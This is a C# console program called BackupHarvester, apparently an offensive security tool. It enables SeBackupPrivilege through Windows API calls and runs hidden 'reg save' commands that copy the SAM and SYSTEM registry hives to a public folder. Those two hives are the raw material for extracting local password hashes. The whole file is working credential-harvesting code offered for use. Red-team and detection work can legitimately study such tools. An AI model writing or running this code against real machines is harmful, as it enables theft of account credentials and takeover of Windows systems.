using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;

namespace BackupHarvester
{
    class Program
    {
        private const uint SE_PRIVILEGE_ENABLED = 0x00000002;
        private const string SE_BACKUP_NAME = "SeBackupPrivilege";

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(IntPtr processHandle, uint desiredAccess, out IntPtr tokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, ref LUID lpLuid);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, [MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint Zero, IntPtr Null1, IntPtr Null2);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [StructLayout(LayoutKind.Sequential)]
        private struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct TOKEN_PRIVILEGES
        {
            public uint PrivilegeCount;
            public LUID_AND_ATTRIBUTES PrivilegeLuid;
        }

        static void Main(string[] args)
        {
            Console.WriteLine(@"

▒█▀▀█ █▀▀█ █▀▀ █░█ █░░█ █▀▀█ ▒█░▒█ █▀▀█ █▀▀█ ▀█░█▀ █▀▀ █▀▀ ▀▀█▀▀ █▀▀ █▀▀█ 
▒█▀▀▄ █▄▄█ █░░ █▀▄ █░░█ █░░█ ▒█▀▀█ █▄▄█ █▄▄▀ ░█▄█░ █▀▀ ▀▀█ ░░█░░ █▀▀ █▄▄▀ 
▒█▄▄█ ▀░░▀ ▀▀▀ ▀░▀ ░▀▀▀ █▀▀▀ ▒█░▒█ ▀░░▀ ▀░▀▀ ░░▀░░ ▀▀▀ ▀▀▀ ░░▀░░ ▀▀▀ ▀░▀▀

Author: Matan Bahar
");

            Console.WriteLine("Starting backup harvesting...");

            try
            {
                // Check if user has admin privileges
                if (!IsUserAdministrator())
                {
                    Console.WriteLine("This program requires administrator privileges to run.");
                    Console.ReadKey();
                    return;
                }

                // Enable backup privilege
                EnablePrivilege(SE_BACKUP_NAME);

                // Harvest backup
                HarvestBackup();

                Console.WriteLine("Backup harvested successfully!");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                Console.ReadKey();
            }
        }

        static bool IsUserAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        static void EnablePrivilege(string privilegeName)
        {
            IntPtr tokenHandle = IntPtr.Zero;
            LUID privilegeLuid = new LUID();
            TOKEN_PRIVILEGES tokenPrivileges = new TOKEN_PRIVILEGES();

            try
            {
                Console.WriteLine($"Enabling {privilegeName} privilege...");

                // Open current process token
                if (!OpenProcessToken(Process.GetCurrentProcess().Handle, 0x0020, out tokenHandle))
                {
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }

                // Lookup privilege LUID
                if (!LookupPrivilegeValue(null, privilegeName, ref privilegeLuid))
                {
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }

                // Set privilege state
                tokenPrivileges.PrivilegeCount = 1;
                tokenPrivileges.PrivilegeLuid = new LUID_AND_ATTRIBUTES();
                tokenPrivileges.PrivilegeLuid.Luid = privilegeLuid;
                tokenPrivileges.PrivilegeLuid.Attributes = SE_PRIVILEGE_ENABLED;

                // Enable privilege

                if (!AdjustTokenPrivileges(tokenHandle, false, ref tokenPrivileges, 0, IntPtr.Zero, IntPtr.Zero))
                {
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }
                Console.WriteLine($"{privilegeName} privilege enabled.");
            }
            finally
            {
                if (tokenHandle != IntPtr.Zero)
                {
                    CloseHandle(tokenHandle);
                }
            }
        }

        static void HarvestBackup()
        {
            Console.WriteLine("Saving registry hives...");

            // Set the destination directory
            string destinationDirectory = "C:\\Users\\Public";

            // Create the directory if it doesn't exist
            if (!Directory.Exists(destinationDirectory))
            {
                Directory.CreateDirectory(destinationDirectory);
            }

            // Set the source keys
            string samKey = "HKEY_LOCAL_MACHINE\\SAM";
            string systemKey = "HKEY_LOCAL_MACHINE\\SYSTEM";

            // Set the destination file paths
            string samFilePath = Path.Combine(destinationDirectory, "sam");
            string systemFilePath = Path.Combine(destinationDirectory, "system");

            // Save the SAM and SYSTEM registry hives to temporary files
            ProcessStartInfo saveSamInfo = new ProcessStartInfo("reg", $"save \"{samKey}\" \"{samFilePath}\"");
            ProcessStartInfo saveSystemInfo = new ProcessStartInfo("reg", $"save \"{systemKey}\" \"{systemFilePath}\"");

            saveSamInfo.CreateNoWindow = true;
            saveSamInfo.UseShellExecute = false;
            saveSystemInfo.CreateNoWindow = true;
            saveSystemInfo.UseShellExecute = false;

            using (Process saveSamProcess = Process.Start(saveSamInfo))
            {
                saveSamProcess.WaitForExit();
            }

            using (Process saveSystemProcess = Process.Start(saveSystemInfo))
            {
                saveSystemProcess.WaitForExit();
            }

            Console.WriteLine("Registry hives saved successfully!");
        }
    }
}


